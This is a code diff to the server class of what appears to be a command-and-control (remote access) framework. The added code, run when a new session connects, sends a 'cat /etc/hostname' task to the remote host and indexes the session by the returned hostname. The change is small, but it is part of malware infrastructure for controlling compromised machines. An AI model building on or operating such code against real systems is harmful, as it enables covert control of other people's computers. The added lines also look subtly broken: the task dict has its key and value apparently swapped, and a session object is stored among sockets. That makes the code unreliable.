@@ -954,6 +954,8 @@ class C2():
             conn = None
             if int(session) in self.unix_sockets:
                 conn = self.unix_sockets[int(session)]
+               
+
             return self.current_session.run(conn, cmd)
 
     def session_background(self, session=None):
@@ -1021,6 +1023,22 @@ class C2():
 
                     self.unix_sockets[int(session.id)] = server_socket
 
+                    # Create socket with the hostname
+                    hostname_task = globals()['c2'].database.handle_task({'cat /etc/hostname': command, 'session': int(session)})
+                    session.send_task(hostname_task)
+
+                    task = session.recv_task()
+                    if task['task'] == 'prompt': # First task is to display prompt to user
+                        task = session.recv_task() # Second one is the result
+
+                    print(f'hostname task result: {task}')
+
+                    hostname = task['result'].strip()
+
+                    print(f'hostname: {hostname}')
+
+                    self.unix_sockets[hostname] = session
+ 
             else:
                 util.display("\n\n[-]", color='red', style='bright', end=' ')
                 util.display("Failed Connection:", color='white', style='bright', end=' ')
